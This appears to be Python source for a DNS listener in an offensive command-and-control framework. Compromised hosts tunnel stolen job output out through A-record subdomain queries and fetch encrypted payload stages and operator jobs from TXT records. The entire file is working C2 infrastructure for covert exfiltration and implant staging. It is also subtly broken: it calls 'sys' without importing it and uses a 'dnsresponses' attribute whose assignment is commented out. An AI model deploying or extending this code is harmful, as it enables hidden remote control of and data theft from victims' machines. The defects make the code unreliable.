import asyncio
import core.events as events
from io import StringIO
from queue import Queue, Empty
from uuid import UUID
from base64 import b64decode, b64encode
from core.teamserver.listener import Listener
from core.utils import get_ipaddress
from core.thirdparty.dnschef import start_cooking, DNSResponses


class STListener(Listener):
    def __init__(self):
        super().__init__()
        self.name = 'dns'
        self.author = '@byt3bl33d3r'
        self.description = 'DNS Listener'
        #self.dnsresponses = DNSResponses()
        self.TXT_responses = {}
        self.A_responses = {}

        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name': {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'dns'
            },
            'BindIP': {
                'Description'   :   'The IPv4/IPv6 address to bind to.',
                'Required'      :   True,
                'Value'         :   get_ipaddress()
            },
            'Domain': {
                'Description'   :   'The domain to use.',
                'Required'      :   True,
                'Value'         :   ""
            },
            'Port': {
                'Description'   :   'Port for the listener.',
                'Required'      :   True,
                'Value'         :   53
            },
            'Comms': {
                'Description'   :   'C2 Comms to use',
                'Required'      :   True,
                'Value'         :   'doh-dns_google'
            }
        }

    def split_payload(self, payload, queue):
        stream = StringIO(payload)
        chunk = stream.read(255)
        while chunk != '':
            queue.put(chunk)
            chunk = stream.read(255)

    async def do_A(self, addr, record, qname, qtype):
        results, job_id, GUID, _, _, _ = qname.split('.')
        GUID = UUID(GUID)

        try:
            session_response_queue = self.A_responses[GUID]
        except KeyError:
            session_response_queue = self.A_responses[GUID] = {}

        try:
            session_response_queue[job_id].append(results)
        except KeyError:
            session_response_queue[job_id] = []
            session_response_queue[job_id].append(results)

        if session_response_queue[job_id][-1] == 'DONE':
            job_results = ''.join(session_response_queue[job_id][:-1])
            if job_id == 'kex':
                self.TXT_responses[GUID]['kex'] = Queue()
                pub_key = self.dispatch_event(events.KEX, (GUID, addr[0], b64decode(job_results)))
                self.split_payload(b64encode(pub_key), self.TXT_responses[GUID]['kex'])
            else:
                self.dispatch_event(events.JOB_RESULT, (GUID, job_id, b64decode(job_results)))

            del session_response_queue[job_id]

        self.dnsresponses.do_default(addr, record, qname, qtype)

    async def do_TXT(self, addr, record, qname, qtype):
        operation, GUID, _, _, _ = qname.split('.')
        GUID = UUID(GUID)

        try:
            session_response_queue = self.TXT_responses[GUID]
        except KeyError:
            session_response_queue = self.TXT_responses[GUID] = {}

        if operation == 'kex':
            try:
                record = session_response_queue['kex'].get_nowait()
            except Empty:
                pass

        elif operation == "stage":
            try:
                record = session_response_queue['stage'].get_nowait()
            except Empty:
                pass
            except KeyError:
                session_response_queue['stage'] = Queue()
                stage_file = self.dispatch_event(events.ENCRYPT_STAGE, (self["Comms"], GUID, addr[0]))
                if stage_file:
                    self.dispatch_event(events.SESSION_STAGED, f'Sending stage ({sys.getsizeof(stage_file)} bytes) ->  {addr[0]}')

                self.split_payload(b64encode(stage_file), session_response_queue['stage'])
                record = session_response_queue['stage'].get_nowait()

        elif operation == "jobs":
            try:
                record = session_response_queue['jobs'].get_nowait()
            except Empty:
                pass
            except KeyError:
                session_response_queue['jobs'] = Queue()
                job = self.dispatch_event(events.SESSION_CHECKIN, (GUID, addr[0]))
                if job:
                    self.split_payload(b64encode(job), session_response_queue['jobs'])
                    record = session_response_queue['jobs'].get_nowait()

        self.dnsresponses.do_default(addr, record, qname, qtype)

    def run(self):
        loop = asyncio.get_event_loop()
        loop.run_until_complete(start_cooking(
            interface=self['BindIP'],
            nametodns={
                'TXT': {f"*.{self['Domain']}": ""},
                'A': {f"*.{self['Domain']}": "0.0.0.0"}
            },
            nameservers="1.1.1.1#53",
            tcp=False,
            ipv6=False,
            port=self["Port"],
            dnsresponses=self
        ))
